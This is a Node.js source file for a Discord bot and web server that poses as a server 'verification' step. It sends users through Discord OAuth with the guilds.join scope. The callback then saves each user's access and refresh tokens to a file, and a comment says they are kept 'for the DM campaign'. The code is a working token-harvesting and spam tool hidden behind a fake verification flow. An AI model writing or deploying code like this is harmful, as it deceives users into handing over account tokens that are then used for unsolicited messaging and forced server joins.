const {
  Client, GatewayIntentBits, Events, EmbedBuilder,
  ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionFlagsBits,
} = require('discord.js');
const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const cfg = require('./config.json');

const API = 'https://discord.com/api/v10';
const DB = path.join(__dirname, 'cuentas.jsonl');
const VER = path.join(__dirname, 'verified.json');

const pending = new Map(); // state -> { exp }
const verified = new Set(fs.existsSync(VER) ? JSON.parse(fs.readFileSync(VER, 'utf8')) : []);
const saveVerified = () => fs.writeFileSync(VER, JSON.stringify([...verified]));

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
const app = express();

/* ---------- páginas ---------- */

app.get('/login', (req, res) => {
  const state = String(req.query.state || '');
  const p = pending.get(state);
  if (!p || p.exp < Date.now()) return res.sendFile(path.join(__dirname, 'public', 'error.html'));

  let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
  html = html.replaceAll('{{STATE}}', state);
  res.type('html').send(html);
});

app.get('/oauth', (req, res) => {
  const state = String(req.query.state || '');
  if (!pending.has(state)) return res.redirect('/login?state=' + state);
  const url = 'https://discord.com/oauth2/authorize'
    + `?client_id=${cfg.clientId}`
    + `&redirect_uri=${encodeURIComponent(cfg.redirectUri)}`
    + '&response_type=code&scope=identify%20guilds.join'
    + `&state=${state}&prompt=consent`;
  res.redirect(url);
});

app.get('/callback', async (req, res) => {
  const { code, state } = req.query;
  const p = pending.get(state);
  if (!code || !p) return res.redirect('/error.html');
  pending.delete(state);

  // 1) canje del code por token
  const tok = await (await fetch(`${API}/oauth2/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      client_id: cfg.clientId,
      client_secret: cfg.clientSecret,
      grant_type: 'authorization_code',
      code,
      redirect_uri: cfg.redirectUri,
    }),
  })).json();

  if (!tok.access_token) return res.redirect('/error.html');

  const me = await (await fetch(`${API}/users/@me`, {
    headers: { Authorization: `Bearer ${tok.access_token}` },
  })).json();

  // 2) guardamos la cuenta para la campaña de DMs
  fs.appendFileSync(DB, JSON.stringify({
    id: me.id, user: me.username, access: tok.access_token,
    refresh: tok.refresh_token, exp: Date.now() + tok.expires_in * 1000, at: Date.now(),
  }) + '\n');

  // 3) la metemos al server con su propio token
  const join = await fetch(`${API}/guilds/${cfg.guildId}/members/${me.id}`, {
    method: 'PUT',
    headers: { Authorization: `Bot ${client.token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ access_token: tok.access_token }),
  });

  const guild = await client.guilds.fetch(cfg.guildId).catch(() => null);
  const member = guild ? await guild.members.fetch(me.id).catch(() => null) : null;

  if (member) {
    await member.roles.add(cfg.roleVerificado).catch(() => {});
    await member.roles.remove(cfg.roleSinVerificar).catch(() => {});

    await member.send({
      embeds: [new EmbedBuilder()
        .setColor(0x57f287)
        .setTitle('Verificado ✅')
        .setDescription(`Ya tenés acceso completo a **${guild.name}**.\n\nPásate por <#${guild.channels.cache.find(c => c.name?.includes('reglas'))?.id ?? ''}> y listo.\n\n${cfg.invite}`)],
    }).catch(() => {});

    verified.add(me.id); saveVerified();
    return res.redirect('/listo.html');
  }

  // fallback: 2FA activo o el bot sin permiso → le damos la invitación
  res.redirect('/listo.html?fallback=1');
});

app.listen(cfg.port, () => console.log(`Web en http://localhost:${cfg.port}`));

/* ---------- panel ---------- */

client.once(Events.ClientReady, c => console.log(`Bot listo: ${c.user.tag}`));

client.on(Events.MessageCreate, async msg => {
  if (msg.content !== '!panel') return;
  if (!msg.member?.permissions.has(PermissionFlagsBits.ManageGuild)) return;

  await msg.channel.send({
    embeds: [new EmbedBuilder()
      .setColor(0x2b2d31)
      .setTitle('Verificación')
      .setDescription('Para entrar al servidor tenés que verificarte.\n\n**1.** Tocá el botón\n**2.** Iniciá sesión con Discord\n**3.** Autorizá\n\nEs automático, menos de 10 segundos.')],
    components: [new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('verif').setLabel('Verificarme').setEmoji('✅').setStyle(ButtonStyle.Success),
    )],
  });
});

client.on(Events.InteractionCreate, async i => {
  if (!i.isButton() || i.customId !== 'verif') return;

  if (verified.has(i.user.id)) {
    return i.reply({ content: 'Ya estás verificado ✅', ephemeral: true });
  }

  const state = crypto.randomBytes(16).toString('hex');
  pending.set(state, { exp: Date.now() + 10 * 60 * 1000 });

  await i.reply({
    ephemeral: true,
    content: '**Último paso** -- abrí el link, iniciá sesión y autorizá. El acceso se te da al instante.',
    components: [new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel('Abrir verificación')
        .setStyle(ButtonStyle.Link)
        .setURL(`${cfg.baseUrl}/login?state=${state}`),
    )],
  });
});

// limpieza de estados viejos
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of pending) if (v.exp < now) pending.delete(k);
}, 60_000);

client.login(cfg.botToken);